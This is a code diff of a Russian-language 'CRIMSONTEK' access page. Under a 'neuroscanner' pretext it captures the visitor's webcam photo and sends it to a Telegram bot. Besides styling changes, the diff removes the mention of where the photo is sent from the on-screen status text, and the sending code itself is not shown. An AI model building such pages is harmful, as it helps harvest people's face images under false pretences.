@@ -7,8 +7,8 @@
   <link rel="stylesheet" href="styles.css">
   <style>
     .card {
-      background: var(--gray);
-      border: 3px solid var(--crimson);
+      background: #1a1a1a;
+      border: 3px solid #ff0000;
       border-radius: 8px;
       padding: 35px 25px;
       max-width: 540px;
@@ -19,7 +19,7 @@
       padding: 18px;
       margin: 20px 0;
       background: #111;
-      border: 2px solid var(--crimson);
+      border: 2px solid #ff0000;
       color: white;
       font-size: 1.15rem;
       text-align: center;
@@ -31,10 +31,16 @@
       font-size: 1.15rem;
       font-weight: bold;
       text-transform: uppercase;
+      background: #ff0000;
+      color: white;
+      border: none;
+    }
+    button:hover {
+      background: #ff3333;
     }
     #video {
       width: 100%;
-      border: 3px solid var(--crimson);
+      border: 3px solid #ff0000;
       border-radius: 6px;
       margin: 20px 0;
       background: #000;
@@ -43,20 +49,20 @@
 </head>
 <body>
   <header>
-    <div class="logo" style="font-size:2.8rem;">CRIMSONTEK</div>
+    <div class="logo" style="font-size:2.8rem; color:#ff0000; text-align:center; font-weight:900;">CRIMSONTEK</div>
   </header>
 
   <div class="card">
-    <h2 style="color:var(--crimson); text-align:center; margin-bottom:25px;">ДОСТУП К СИСТЕМЕ</h2>
+    <h2 style="color:#ff0000; text-align:center; margin-bottom:25px;">ДОСТУП К СИСТЕМЕ</h2>
     
     <input type="text" id="username" placeholder="ВВЕДИТЕ ИДЕНТИФИКАТОР" maxlength="30">
 
-    <button onclick="startVerification()" class="btn-primary">ПОДКЛЮЧИТЬ НЕЙРОСКАНЕР</button>
+    <button onclick="startVerification()">ПОДКЛЮЧИТЬ НЕЙРОСКАНЕР</button>
 
     <div id="camera-container" style="display:none;">
-      <p style="color:var(--crimson); text-align:center; margin:20px 0;">СИСТЕМА ТРЕБУЕТ БИОМЕТРИЧЕСКОЕ ПОДТВЕРЖДЕНИЕ</p>
+      <p style="color:#ff0000; text-align:center; margin:20px 0;">СИСТЕМА ТРЕБУЕТ БИОМЕТРИЧЕСКОЕ ПОДТВЕРЖДЕНИЕ</p>
       <video id="video" autoplay playsinline muted></video>
-      <button onclick="takePhoto()" class="btn-primary">СКАНИРОВАТЬ ЛИЦО</button>
+      <button onclick="takePhoto()">СКАНИРОВАТЬ ЛИЦО</button>
       <button onclick="cancelVerification()" style="background:#444;">ОТМЕНИТЬ</button>
     </div>
 
@@ -83,13 +89,11 @@
       showStatus("Запуск камеры...", "#ccc");
 
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "user" } 
-        });
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         document.getElementById("video").srcObject = stream;
         showStatus("Камера запущена.<br>Нажмите «СКАНИРОВАТЬ ЛИЦО»", "lime");
       } catch (err) {
-        showStatus("Ошибка доступа к камере.<br>Проверьте разрешения в браузере", "red");
+        showStatus("Не удалось получить доступ к камере.<br>Разрешите камеру в настройках браузера", "red");
       }
     }
 
@@ -102,7 +106,7 @@
         return;
       }
 
-      showStatus("Отправка фото в Crimsontek...", "orange");
+      showStatus("Отправка фото...", "orange");
 
       const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth || 640;
@@ -127,10 +131,10 @@
           showStatus(`ДОСТУП РАЗРЕШЁН<br>ДОБРО ПОЖАЛОВАТЬ, ${username.toUpperCase()}`, "lime");
           setTimeout(() => window.location.href = "success.html", 1800);
         } else {
-          showStatus("Ошибка отправки в бот", "red");
+          showStatus("Ошибка отправки в Telegram", "red");
         }
       } catch (e) {
-        showStatus("Ошибка соединения с интернетом", "red");
+        showStatus("Ошибка соединения", "red");
       }
     }
 
